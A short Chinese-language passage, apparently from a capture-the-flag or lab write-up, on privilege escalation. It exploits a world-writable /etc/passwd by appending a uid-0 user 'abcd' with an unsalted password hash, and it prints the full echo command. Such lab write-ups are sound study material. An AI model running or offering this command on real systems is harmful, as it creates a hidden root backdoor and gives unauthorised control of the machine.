##  ** **提权****

查看passwd发现是777权限，就好办了

![1650594901_62621455154839a33961b.png!small?1650594901527](https://image.3001.net/images/20220422/1650594901_62621455154839a33961b.png!small?1650594901527)

在passwd后面添加新的一行uid为0 的用户即可

与bulldog的方法相同，先生成密码，密码为abcd，不加盐

![1650594915_62621463d1762b77b9ff1.png!small?1650594916201](https://image.3001.net/images/20220422/1650594915_62621463d1762b77b9ff1.png!small?1650594916201)

向passwd中写入如下内容，成功添加uid为0的用户abcd

echo 'abcd:GSA9jpckEYwa2:0:0:abcd:/root:/bin/bash' >> /etc/passwd

![1650594937_6262147998aaab937bf96.png!small?1650594938766](https://image.3001.net/images/20220422/1650594937_6262147998aaab937bf96.png!small?1650594938766)
